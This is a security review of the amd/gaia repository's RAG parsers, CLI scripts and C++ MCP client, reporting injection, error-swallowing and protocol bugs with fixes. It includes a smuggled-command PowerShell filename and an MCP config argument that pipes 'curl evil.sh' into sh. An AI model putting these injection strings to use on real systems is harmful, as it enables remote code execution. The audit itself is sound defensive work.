# Critical scan C — RAG document parsers, RAG entry points, C++ MCP client

Scope: files the main review of amd/gaia @ 211f08c5 did not audit.
Read fully: `src/gaia/rag/pdf_utils.py`, `src/gaia/rag/pptx_utils.py`,
`src/gaia/rag/app.py`, `src/gaia/rag/demo.py`, `cpp/src/mcp_client.cpp`.

---

## 1. `src/gaia/rag/pptx_utils.py`

### [🔴] PowerShell command injection via a document filename containing a single quote

- **Where:** `src/gaia/rag/pptx_utils.py:313-336` (`convert_pptx_to_pdf`), reached from
  `src/gaia/rag/sdk.py:1048` (`_extract_text_from_pptx`)
- **What:** The PPTX→PDF fast path builds a PowerShell script by f-string-interpolating the
  attacker-controlled absolute file path into a *single-quoted PowerShell string literal*, then
  runs it with `powershell -NoProfile -Command <script>`. A `'` anywhere in the path terminates
  the literal, so the rest of the filename is parsed as PowerShell code. The upload sanitizer
  (`src/gaia/ui/routers/documents.py:123`) does **not** strip `'`.
- **Failure scenario:** A user is sent (or a browser/download tool fetches) a deck named
  `quarterly'; Start-Process calc; '.pptx`. It is uploaded through the Agent UI documents
  endpoint — `_sanitize_stem` only replaces `<>:"/\|?*` and control chars, so the quote
  survives verbatim into the on-disk name. Indexing the document calls
  `convert_pptx_to_pdf(str(Path(pptx_path).resolve()), tmp_dir)`, and the injected statement
  executes with the user's privileges. No prompt, no user confirmation — indexing is enough.
- **Evidence:**

```python
# pptx_utils.py:313-327
    ps_script = (
        "$ErrorActionPreference = 'Stop'; "
        "$ppt = New-Object -ComObject PowerPoint.Application; "
        "try { "
        f"  $pres = $ppt.Presentations.Open('{pptx_abs}', "
...
        f"  $pres.SaveAs('{pdf_abs}', 32); "
```

```python
# pptx_utils.py:330-336
        result = subprocess.run(
            ["powershell", "-NoProfile", "-Command", ps_script],
```

```python
# ui/routers/documents.py:123 — no "'" in the illegal set
_ILLEGAL_FILENAME_CHARS = '<>:"/\|?*'
```

  Reproduced the string construction verbatim with the repo venv (no PowerShell executed):

```
$ppt.Presentations.Open('C:\Users\x\docs\abc'; Start-Process calc; '.pptx',  [int]-1, ...
                                             ^^^^^^^^^^^^^^^^^^^^^^ top-level PS statement
```

  The comment at `pptx_utils.py:309-311` asserts the opposite of what the code does:
  `"Single-quoted paths handle spaces correctly."` — they handle *spaces*, not quotes.
- **Fix:** Do not build a script string from the path at all. Either (a) pass the paths as
  PowerShell *parameters* — `powershell -NoProfile -File conv.ps1 -Pptx <path> -Pdf <path>`
  with the script shipped as a static file so argv carries the data, or (b) at minimum escape
  by doubling single quotes (`pptx_abs.replace("'", "''")`) for both paths, which is the
  correct escape for a PS single-quoted literal. (a) is preferable; (b) is the one-line stopgap.
  Independently, add `'` (and backtick, `$`) to `_ILLEGAL_FILENAME_CHARS` as defense in depth.
- **Confidence:** High

### [🟢] Aspect ratios steeper than 1600:1 truncate a dimension to 0 and drop the image

- **Where:** `src/gaia/rag/pptx_utils.py:72-79` and the identical code in
  `src/gaia/rag/pdf_utils.py:62-74`; also the halving loop (`pptx_utils.py:97-99`,
  `pdf_utils.py:97-100`)
- **What:** The downscale computes `int(width * scale)` with no floor of 1, so a very wide/thin
  image (a rule, banner, or table-border strip) resizes to height `0` and `Image.resize` raises.
  The `except Exception` handler turns that into a skipped image.
- **Failure scenario:** A slide/page contains a 20000x3 divider bitmap that carries rendered
  text. `scale = min(1600/20000, 1600/3) = 0.08` -> `(1600, 0)` -> `ValueError: height and width
  must be > 0` -> warning logged, image never reaches the VLM, its text is missing from the
  index. Verified against the repo's Pillow:

```
scale 0.08 new 1600 0
ERR ValueError height and width must be > 0
```

- **Evidence:**

```python
# pptx_utils.py:73-75
                scale = min(MAX_DIMENSION / width, MAX_DIMENSION / height)
                new_width = int(width * scale)
                new_height = int(height * scale)
```

```python
# pptx_utils.py:97-99  (same class of bug -- width//2 reaches 0)
                img = img.resize(
                    (img.width // 2, img.height // 2), Image.Resampling.LANCZOS
                )
```

- **Fix:** `new_width = max(1, int(width * scale))` (same for height), and
  `max(1, img.width // 2)` in the compression loop.
- **Confidence:** High

### [🟢] Note — decompression-bomb protection is Pillow's default, not the repo's

`Image.open` in both modules relies on Pillow's `MAX_IMAGE_PIXELS` (~179M px; hard error only
above 2x). Between 1x and 2x the limit Pillow emits a *warning* and decodes anyway, so a crafted
PPTX/PDF image can still force a ~1 GB RGB decode per image before the resize at
`pptx_utils.py:79` runs. Not a finding on its own (the per-image `except Exception` contains a
`DecompressionBombError`), but if you want a bound, set `Image.MAX_IMAGE_PIXELS` explicitly at
module import rather than inheriting it.

---

## 2. `src/gaia/rag/pdf_utils.py`

### [🟡] `except Exception: pass` turns an unreadable page into "this page has no images"

- **Where:** `src/gaia/rag/pdf_utils.py:183-184` (`count_images_in_page`), doubled by
  `src/gaia/rag/sdk.py:815-818`
- **What:** Any failure resolving a page's `/Resources` or `/XObject` (indirect-object
  resolution failure, malformed dictionary, damaged xref) is swallowed and reported as
  `(False, 0)`. `sdk.py` uses that boolean as the sole gate on whether the VLM runs, so the
  page silently degrades to whatever `pypdf.extract_text()` returned — often the empty string
  for a scanned page. Directly violates the repo's own "No Silent Fallbacks — Fail Loudly" rule.
- **Failure scenario:** A user indexes a scanned/damaged PDF whose page objects pypdf can open
  but whose XObject dictionary raises on access. `count_images_in_page` returns `(False, 0)`;
  `extract_images_from_page_pymupdf` is never called; the page contributes an empty chunk.
  Nothing is logged at any level. The user then asks a question answerable only from that page
  and gets a confident, ungrounded answer — the exact failure mode the fail-loudly rule exists
  to prevent, and it is indistinguishable from "the page really was blank."
- **Evidence:**

```python
# pdf_utils.py:176-186
    try:
        if "/XObject" in page.get("/Resources", {}):
            ...
    except Exception:  # pylint: disable=broad-except
        pass

    return (count > 0, count)
```

```python
# sdk.py:813-818 — the caller swallows it a second time
                if vlm_available:
                    try:
                        has_imgs, num_imgs = count_images_in_page(page)
                    except Exception:  # pylint: disable=broad-except
                        pass
```

  Contrast the PPTX equivalent at `sdk.py:1177`, which at least logs
  `"count_images_in_slide failed on slide %d: %s"`.
- **Fix:** At minimum `logger.warning("XObject scan failed on page %d: %s", page_num, e)` and
  return a third state the caller can act on (e.g. raise, or a sentinel) so the page is marked
  `extraction_degraded` in its metadata rather than silently indexed as text-only. Remove the
  duplicate swallow in `sdk.py:816-818`. Note `count_images_in_page` does not even take
  `page_num`, so it currently cannot name the page in a log line — add the parameter.
- **Confidence:** High

### [🟢] The PDF is re-opened once per page during image extraction

- **Where:** `src/gaia/rag/pdf_utils.py:35` (`fitz.open(pdf_path)` inside
  `extract_images_from_page_pymupdf`) and `:218` (same in `get_image_positions_on_page`),
  called per-page from `src/gaia/rag/sdk.py:823`
- **What:** Each function takes a *path* and a *page number*, so indexing an N-page PDF parses
  the whole document N times instead of once. On a hostile (or merely large) file this is wasted
  work proportional to `pages x document size`.
- **Failure scenario:** A 5,000-page PDF with an image on every page triggers 5,000 full
  `fitz.open()` / `doc.close()` cycles. (In practice the per-image VLM call dominates wall
  clock, which is why this is 🟢 and not 🟡.)
- **Evidence:**

```python
# pdf_utils.py:35
        doc = fitz.open(pdf_path)
```

```python
# sdk.py:823 — called inside `for i, page in enumerate(reader.pages, 1)`
                        images = extract_images_from_page_pymupdf(pdf_path, page_num=i)
```

- **Fix:** Open the `fitz.Document` once in `_extract_text_from_pdf` and pass it down, or add a
  small module-level cache keyed on `(path, mtime)`.
- **Confidence:** High

**No path-traversal, temp-file, or subprocess issue found in `pdf_utils.py`.** It writes no
files — every image stays in an `io.BytesIO` — and invokes no subprocess. Its only outbound path
use is `fitz.open(pdf_path)` on a path the caller already resolved.

---

## 3. `src/gaia/rag/app.py` and `src/gaia/rag/demo.py`

**Neither binds a server, opens a socket, exposes an endpoint, or hardcodes a key or
credential.** Both are argparse/print-only CLI scripts operating on local files. Verified by
reading both end to end: no `uvicorn`, `FastAPI`, `socket`, `bind`, `listen`, `api_key`, or
token literal appears in either.

### [🟡] Both files advertise a `gaia rag` command that does not exist

- **Where:** `src/gaia/rag/app.py:76,204-216` and `src/gaia/rag/demo.py:236-265,295`
- **What:** `app.py`'s `main()` is registered nowhere — there is no `gaia rag` subparser in
  `src/gaia/cli.py` and no `console_scripts` entry in `setup.py` pointing at
  `gaia.rag.app:main`. Yet both files print `gaia rag ...` as the recommended usage, and
  `demo.py` devotes a whole section (`demo_cli_commands`) to nine such commands.
- **Failure scenario:** A user runs the shipped demo, follows its final instruction
  (`"4. Try the CLI commands: gaia rag --help"`), and gets an argparse "invalid choice" error.
  Same for the error path in `app.py:76`, which tells a user with no indexed documents to run
  `gaia rag index document.pdf`.
- **Evidence:** the only `"rag"` literal in `src/gaia/cli.py` is an `init --profile` choice:

```python
# cli.py:2929-2941
    init_parser.add_argument(
        "--profile",
        ...
            "rag",
```

  A grep for an `add_parser` call whose first argument is `rag` in `src/gaia/cli.py` returns
  nothing, and no `gaia.rag.app` reference exists in `setup.py`.
- **Fix:** Either register the subcommand (a `subparsers.add_parser("rag", ...)` delegating to
  `gaia.rag.app:main`) or delete `app.py` / `demo.py` and their `gaia rag` strings. Shipping a
  dead entry point that documents a nonexistent command is exactly the doc-vs-code contradiction
  the repo's CLAUDE.md calls out.
- **Confidence:** High

### [🟢] `app.py` default model contradicts the documented single default

- **Where:** `src/gaia/rag/app.py:250-252`
- **What:** `--model` defaults to `"Llama-3.2-3B-Instruct-Hybrid"`, while CLAUDE.md and
  `DEFAULT_MODEL_NAME` in `src/gaia/llm/lemonade_client.py` make `Gemma-4-E4B-it-GGUF` the
  single shared default. Loading a second model evicts the resident one.
- **Evidence:**

```python
# app.py:250-252
        subparser.add_argument(
            "--model", default="Llama-3.2-3B-Instruct-Hybrid", help="Model to use"
        )
```

- **Fix:** `default=DEFAULT_MODEL_NAME` imported from `gaia.llm.lemonade_client` (moot if the
  file is deleted per the previous finding).
- **Confidence:** High

### [🟢] `demo.py` mutates `sys.path` at import time

`src/gaia/rag/demo.py:14` runs `sys.path.append(str(Path(__file__).parent.parent.parent))`
unconditionally at module scope, so merely *importing* the module appends `site-packages` to
`sys.path` in an installed wheel. Harmless today; delete it with the file.

```python
# demo.py:13-14
# Add parent to path for imports
sys.path.append(str(Path(__file__).parent.parent.parent))
```

---

## 4. `cpp/src/mcp_client.cpp` — Appendix D verdicts

All three Appendix-D hypotheses are **CONFIRMED at HEAD (211f08c5)**. Quoted lines below.

### D.1 — hardcoded `protocolVersion "1.0.0"` — ✅ CONFIRMED

### [🟡] The C++ MCP client sends a protocol version that does not exist

- **Where:** `cpp/src/mcp_client.cpp:698-705` (`MCPClient::connect`)
- **What:** MCP protocol versions are dates (`2024-11-05`, `2025-03-26`, `2025-06-18`).
  `"1.0.0"` is not one, and the client never reads back `result.protocolVersion` to check what
  the server actually negotiated. It also never sends the spec-required
  `notifications/initialized` after `initialize`.
- **Failure scenario:** A spec-strict server rejects the handshake outright, or negotiates down
  and the client proceeds assuming a capability set it never confirmed. A server that requires
  `notifications/initialized` before serving `tools/list` returns an empty tool list, which
  `listTools` at `mcp_client.cpp:747-749` converts to `{}` with no error — the agent then
  reports it has no tools rather than reporting a handshake failure.
- **Evidence:**

```cpp
// mcp_client.cpp:698-705
        json response = transport_->sendRequest("initialize", {
            {"protocolVersion", "1.0.0"},
            {"clientInfo", {
                {"name", "GAIA C++ MCP Client"},
                {"version", "0.1.0"}
            }},
            {"capabilities", json::object()}
        });
```

  The repo contradicts itself: its own C++ MCP **server** in the same tree answers with a real
  dated version and handles the notification the client never sends —

```cpp
// cpp/agents/bash/mcp_server.cpp:96
        {"protocolVersion", "2024-11-05"},
```

```cpp
// cpp/agents/bash/mcp_server.cpp:76
    } else if (method == "notifications/initialized") {
```

- **Fix:** Send a real dated version, read `result["protocolVersion"]` back and fail loudly on a
  mismatch, and send `notifications/initialized` before the first `tools/list`.
- **Confidence:** High

### D.2 — naive argv concatenation + POSIX shell — ✅ CONFIRMED (and a shell IS involved)

### [🔴] Every MCP server arg is concatenated into one string and handed to `/bin/sh -c`

- **Where:** `cpp/src/mcp_client.cpp:551-565` (`StdioTransport::connect`) and
  `cpp/src/mcp_client.cpp:448` (POSIX `Impl::launch`)
- **What — exactly how the command string is built:** `connect()` starts with `command_` and
  appends `" " + quoteArg(arg)` for each element of `args_`. `quoteArg` wraps an argument in
  double quotes **only if it contains a space**, and never escapes anything — not a quote, not a
  backslash, not `$`, not a backtick. On POSIX the resulting single string is passed to
  `execl("/bin/sh", "sh", "-c", cmdLine.c_str(), nullptr)` — **a shell IS involved**
  (`/bin/sh -c`; not `execvp`, not `posix_spawn`, not `popen`/`system`). Every shell
  metacharacter in `command` or any `args` element is therefore interpreted by `sh`.
- **Failure scenario:** `~/.gaia/mcp_servers.json` (or `mcp.json`) contains an entry whose args
  carry a metacharacter — e.g.
  `{"command":"npx","args":["-y","@scope/server","--token","; curl evil.sh | sh ;"]}`.
  `MCPClient::fromConfig` (`mcp_client.cpp:650-674`) copies those strings verbatim into `args_`;
  `connect()` produces `npx -y @scope/server --token ; curl evil.sh | sh ;` and `/bin/sh -c`
  runs the injected pipeline with the agent's privileges. Anything that can write that config
  file — a connector install, a hub package, a synced dotfile, a malicious `gaia connectors`
  payload — gets code execution at the next MCP connect, and none of it passes through the
  tool-confirmation gate at `mcp_client.cpp:170-189`, because that gate only classifies *tool
  names*, never the *server launch*. Even with no attacker: a legitimate arg containing `$`,
  `&`, `*`, `(` or a backtick is silently mangled, and one containing an unbalanced quote breaks
  the whole command.
- **Evidence:**

```cpp
// mcp_client.cpp:550-565
    // Build command line, quoting arguments that contain spaces
    auto quoteArg = [](const std::string& arg) -> std::string {
        if (arg.find(' ') != std::string::npos) {
            return "\"" + arg + "\"";
        }
        return arg;
    };
    std::string cmdLine;
    if (args_.empty()) {
        cmdLine = command_;
    } else {
        cmdLine = command_;
        for (const auto& arg : args_) {
            cmdLine += " " + quoteArg(arg);
        }
    }
```

```cpp
// mcp_client.cpp:448 — the shell
            execl("/bin/sh", "sh", "-c", cmdLine.c_str(), nullptr);
            _exit(127);
```

```cpp
// mcp_client.cpp:658-662 — args come straight from JSON, unvalidated
    if (config.contains("args")) {
        for (const auto& arg : config["args"]) {
            args.push_back(arg.get<std::string>());
        }
    }
```

- **Fix:** Drop the string entirely on POSIX. Build a `char* argv[]` from `command_` + `args_`
  and call `execvp(command_.c_str(), argv)` — no shell, no quoting, no escaping needed. Keep the
  concatenated string only for the `debug_` log line at `:568`.
- **Confidence:** High

### [🟡] The same concatenation is a quoting bug on Windows (no shell, but still wrong)

- **Where:** `cpp/src/mcp_client.cpp:326-334` (`CreateProcessA`)
- **What:** Windows passes `lpApplicationName = nullptr` and the same concatenated `cmdLine`, so
  `CreateProcess` applies its own argv-splitting rules to a string built by a quoter that
  neither escapes an embedded quote nor handles trailing backslashes. No shell is involved here,
  so this is argument corruption / argument injection rather than command injection — but an arg
  containing a quote still re-splits the command line.
- **Evidence:**

```cpp
// mcp_client.cpp:326-334
        std::string mutableCmd(cmdLine);
        BOOL ok = CreateProcessA(
            nullptr,
            mutableCmd.data(),
```

- **Fix:** Pass `lpApplicationName = command_` and build `lpCommandLine` with the documented
  `CommandLineToArgvW` escaping rules (double each interior quote; double the run of backslashes
  that precedes a quote).
- **Confidence:** High

### D.3 — does not unwrap `content[]` / `isError` — ✅ CONFIRMED

### [🟡] A failed MCP tool call is handed to the model as a success, envelope and all

- **Where:** `cpp/src/mcp_client.cpp:775-802` (`MCPClient::callTool`), consumed at
  `cpp/src/agent.cpp:840` and `:855`, checked at `agent.cpp:1393-1394` and `:1308`
- **What:** `callTool` handles only the JSON-RPC *transport* error (`response["error"]`) and
  then returns `result` raw. MCP signals tool-level failure inside the result as
  `{"content": [...], "isError": true}` — neither field is read. The agent's error check looks
  for a `status` field that an MCP result never carries, so `errorCount` never increments and
  `ERROR_RECOVERY` never triggers for an MCP tool. The model receives the JSON envelope
  (`truncateToolResult` is a bare `toolResult.dump()`) instead of the text.
- **Failure scenario:** A GitHub MCP tool returns
  `{"content":[{"type":"text","text":"Error: repository not found"}],"isError":true}`. The agent
  records that as a successful tool result, feeds the model the whole envelope verbatim, and its
  retry/recovery path stays dormant — the agent then narrates a successful lookup that never
  happened. Note `cpp/src/clean_console.cpp:162` *does* unwrap `content[]`, but only for the
  human-facing display: the terminal shows the friendly text while the model sees the envelope,
  so operator and model disagree about what happened.
- **Evidence:**

```cpp
// mcp_client.cpp:790-801 — only the JSON-RPC error is handled
    if (response.contains("error")) {
        auto error = response["error"];
        return json{{"error", error.value("message", "Unknown error")}};
    }

    json result = response.value("result", json::object());
    ...
    return result;
```

```cpp
// agent.cpp:1393-1394 — checks a key MCP never sets
            bool isError = toolResult.is_object() &&
                           toolResult.value("status", "") == "error";
```

```cpp
// agent.cpp:1017-1018 — the model sees the raw envelope
std::string truncateToolResult(const json& toolResult) {
    std::string resultStr = toolResult.dump();
```

  The repo's own MCP server proves the shape the client is ignoring:

```cpp
// cpp/agents/bash/mcp_server.cpp:191-192
        {"content", json::array({json{{"type", "text"}, {"text", resultText}}})},
        {"isError", isError}
```

- **Fix:** In `callTool`, flatten the text parts of `result["content"]` into a single string and
  map `result["isError"] == true` onto the shape `agent.cpp` already recognizes
  (`{"status":"error","error": <text>}`), so MCP failures feed the existing recovery path.
- **Confidence:** High

### [🟢] `listTools` swallows a server-side error into an empty tool list

- **Where:** `cpp/src/mcp_client.cpp:747-749`
- **What:** `if (response.contains("error")) { return {}; }` — a JSON-RPC error from
  `tools/list` is indistinguishable from "this server has no tools," and nothing is logged or
  stored in `lastError_`. The registry header states the opposite intent at
  `cpp/include/gaia/mcp_registry.h:40-42`: *"A skill that silently loses its MCP tools produces
  an agent confidently claiming it cannot do something it was configured to do, so nothing here
  degrades quietly."*
- **Evidence:**

```cpp
// mcp_client.cpp:745-749
    json response = transport_->sendRequest("tools/list");

    if (response.contains("error")) {
        return {};
    }
```

- **Fix:** Set `lastError_` and throw (or return `std::optional`), matching the registry's
  stated fail-loudly contract.
- **Confidence:** High

**Not findings — verified sound.** The confirmation classifier (`mcp_client.cpp:43-189`) is
genuinely fail-closed: an empty tool name, a missing or non-object `annotations`, a non-boolean
`readOnlyHint`, and an unclassifiable name all return `true` (confirm), and a server's
`readOnlyHint: true` is overruled by a mutating verb found in the tool name
(`namePromisesMutation`). Both platforms' `readLine` are bounded by an explicit timeout and
throw on expiry, so a silent MCP server cannot hang the agent indefinitely.

---

## Summary

| # | Sev | File | Finding |
|---|-----|------|---------|
| 1 | 🔴 | `rag/pptx_utils.py:313-336` | PowerShell injection — a document filename containing `'` is interpolated into a `-Command` script; the upload sanitizer does not strip `'` |
| 2 | 🔴 | `cpp/src/mcp_client.cpp:551-565,448` | MCP server argv is concatenated into one string and run via `/bin/sh -c`; config-controlled args reach the shell |
| 3 | 🟡 | `rag/pdf_utils.py:183-184` | `except Exception: pass` reports an unreadable page as "no images" → VLM skipped → ungrounded RAG answer |
| 4 | 🟡 | `rag/app.py`, `rag/demo.py` | Both advertise a `gaia rag` CLI that is registered nowhere |
| 5 | 🟡 | `cpp/src/mcp_client.cpp:698-705` | `protocolVersion "1.0.0"` is not an MCP version; no version read-back; `notifications/initialized` never sent |
| 6 | 🟡 | `cpp/src/mcp_client.cpp:326-334` | Windows `CreateProcessA` gets the same unescaped concatenated command line |
| 7 | 🟡 | `cpp/src/mcp_client.cpp:775-802` | `content[]` / `isError` never unwrapped; a failed MCP tool reads as success to the model |
| 8 | 🟢 | `rag/pptx_utils.py:73-75`, `rag/pdf_utils.py:64-67` | Aspect ratios > 1600:1 truncate a dimension to 0; the image is dropped |
| 9 | 🟢 | `rag/pdf_utils.py:35,218` | The PDF is re-opened with PyMuPDF once per page |
| 10 | 🟢 | `rag/app.py:250-252` | Default model contradicts `DEFAULT_MODEL_NAME` |
| 11 | 🟢 | `rag/demo.py:14` | `sys.path.append` at module import scope |
| 12 | 🟢 | `cpp/src/mcp_client.cpp:747-749` | `listTools` turns a server error into an empty tool list, silently |

**Explicit negatives — a full read found nothing at or above 🟡 in these areas:**

- **`src/gaia/rag/pdf_utils.py` path handling / subprocess:** none. It writes no files (images
  stay in `io.BytesIO`), spawns no process, and its only path use is `fitz.open(pdf_path)` on an
  already-resolved caller path. Its one finding is the error-swallowing at `:183`.
- **`src/gaia/rag/app.py` and `src/gaia/rag/demo.py` as attack surface:** neither binds a
  server, opens a socket, exposes an endpoint, nor hardcodes a key, token, or credential. Their
  findings are dead-entry-point and default-drift, not security.
- **`src/gaia/rag/pptx_utils.py` recursion depth:** `_iter_shapes` is correctly bounded by
  `MAX_GROUP_DEPTH = 5` and logs when it truncates — no stack-overflow path from nested groups.
- **`cpp/src/mcp_client.cpp` confirmation gate and read timeouts:** fail-closed and bounded as
  described above.

**Two highest-priority fixes:** (1) `pptx_utils.convert_pptx_to_pdf` — stop building a
PowerShell script from a filename; (2) `mcp_client.cpp` POSIX launch — `execvp` an argv array
instead of `/bin/sh -c` on a concatenated string. Both are contained, local changes.

**Cross-cutting theme:** findings 1, 2, and 6 are the same mistake in two languages — a list of
arguments flattened into a string that some interpreter then re-parses. Findings 3, 7, and 12
are the same mistake too — an error path that returns the shape of success, which is precisely
what the repo's own "No Silent Fallbacks — Fail Loudly" rule forbids.
